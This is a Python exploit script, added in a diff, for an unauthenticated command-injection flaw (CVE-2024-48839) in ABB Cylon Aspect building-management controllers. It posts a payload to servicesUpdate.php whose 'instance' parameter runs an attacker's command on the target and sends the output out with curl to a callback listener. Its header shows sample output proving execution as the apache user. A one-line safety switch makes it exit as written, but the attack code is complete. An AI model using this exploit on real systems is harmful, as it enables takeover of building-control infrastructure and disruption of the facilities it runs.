@@ -1,0 +1,187 @@
+#!/usr/bin/env python
+#
+#
+# ABB Cylon Aspect 3.08.01 (servicesUpdate.php) Remote Code Execution
+#
+#
+# Vendor: ABB Ltd.
+# Product web page: https://www.global.abb
+# Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio
+#                   Firmware: <=3.08.01
+#
+# Summary: ASPECT is an award-winning scalable building energy management
+# and control solution designed to allow users seamless access to their
+# building data through standard building protocols including smart devices.
+#
+# Desc: The ABB BMS/BAS controller suffers from an unauthenticated blind OS command
+# injection vulnerability. This can be exploited to inject and execute arbitrary
+# shell commands through the 'instance' HTTP POST parameter called by servicesUpdate.php
+# script.
+#
+# ---------------------------------------------------------------------------------
+#
+# ./automatrix.py 192.168.73.31 192.167.73.2 id
+# Exploit starting at 27.09.2024 00:03:35
+# Listening on 192.167.73.2:9999
+# Waiting for incoming connection...
+# Connection established with ('192.168.73.31', 43428)
+#
+# uid=48(apache) gid=48(apache) groups=48(apache),0(root)
+#
+# ---------------------------------------------------------------------------------
+#
+#
+# Tested on: GNU/Linux 3.15.10 (armv7l)
+#            GNU/Linux 3.10.0 (x86_64)
+#            GNU/Linux 2.6.32 (x86_64)
+#            Intel(R) Atom(TM) Processor E3930 @ 1.30GHz
+#            Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz
+#            PHP/7.3.11
+#            PHP/5.6.30
+#            PHP/5.4.16
+#            PHP/4.4.8
+#            PHP/5.3.3
+#            AspectFT Automation Application Server
+#            lighttpd/1.4.32
+#            lighttpd/1.4.18
+#            Apache/2.2.15 (CentOS)
+#            OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64)
+#            OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode)
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2024-5867
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5867.php
+# CVE ID: CVE-2024-48839
+# CVE URL: https://www.cve.org/CVERecord?id=CVE-2024-48839
+#
+#
+# 21.04.2024
+#
+#
+
+
+import re
+import os
+import sys
+import socket
+import datetime
+import requests
+import threading
+from urllib.parse import quote
+from colorama import init, Fore
+
+init()
+
+def safe(*trigger, ):
+    return True # |-| Safety switch
+
+def slushaj(lip, port=9999):
+    shteker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        shteker.bind(("0.0.0.0", port))
+    except socket.error as e:
+        print(f"Error binding to {lip}:{port} - {e}")
+        sys.exit(1)
+    shteker.listen(1)
+    print(f"Listening on {lip}:{port}")
+    return shteker
+
+def stream(shteker):
+    print("Waiting for incoming connection...")    
+    shteker.settimeout(4)
+    try:
+        conn, addr = shteker.accept()
+        print(f"Connection established with {addr}")
+        conn.settimeout(4)
+        try:
+            odg = conn.recv(7117).decode("utf-8")
+            uam = re.search(r"User-Agent:\s*(.*)\s*Host:", odg, re.DOTALL)
+            if uam:
+                uav = uam.group(1)
+                print(f"\n\033[92m{uav}\033[0m")
+                os._exit(0)
+            else:
+                print("No output for you.")
+                os._exit(1)
+        except socket.timeout:
+            print("Too slow: No answer within 4 seconds.")
+            os._exit(2)
+    except socket.timeout:
+        print("Too slow: No callback within 4 seconds.")
+        os._exit(3)
+    finally:
+        conn.close()
+        shteker.close()
+
+def deploy(tip, cmd, lip, port=9999):
+    data = f"serviceAction=restartSingleMix&instance=1$(curl -A \"%60{quote(cmd)}%60\" {lip}:{port})"
+    url = f"http://{tip}/servicesUpdate.php"
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+    r = requests.post(url, data=data, headers=headers)
+
+def njaaah(text):
+    col = os.get_terminal_size().columns
+    print(text.center(col))
+
+def main():
+    if safe(True):
+        print("\nSafety: \033[92mON\033[0m")
+        exit(-17)
+    else:
+        next
+    global start
+    start = datetime.datetime.now()
+    start = start.strftime("%d.%m.%Y %H:%M:%S")
+    title = "\033[91mABB Cylon® ASPECT® Supervisory Building Control v3.08.01\033[0m"
+    subtl = "\033[91m\t-> Unauthenticated Remote Code Execution <-\033[0m"
+    advis = "\033[91mZSL-2024-XXXX\033[0m"
+    prj = f"""
+                 P   R   O   J   E   C   T
+
+                        .|
+                        | |
+                        |'|            ._____
+                ___    |  |            |.   |' .---"|
+        _    .-'   '-. |  |     .--'|  ||   | _|    |
+     .-'|  _.|  |    ||   '-__  |   |  |    ||      |
+     |' | |.    |    ||       | |   |  |    ||      |
+ ____|  '-'     '    ""       '-'   '-.'    '`      |____
+░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ 
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░ 
+         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░
+    
+ {title}
+ {subtl}
+                       {advis}
+    """   
+    if len(sys.argv) != 4:
+        njaaah(prj)
+        print("./automatrix.py <target> <callback> <command>")
+        sys.exit(-1)
+    tip = sys.argv[1]
+    lip = sys.argv[2]
+    cmd = sys.argv[3]
+    print("Exploit starting at", start)
+    shteker = slushaj(lip, port=9999)
+    igla = threading.Thread(target=stream, args=(shteker,))
+    igla.start()
+    exploit = deploy(tip, cmd, lip, port=9999)
+    igla.join()
+
+if __name__ == "__main__":
+    main()
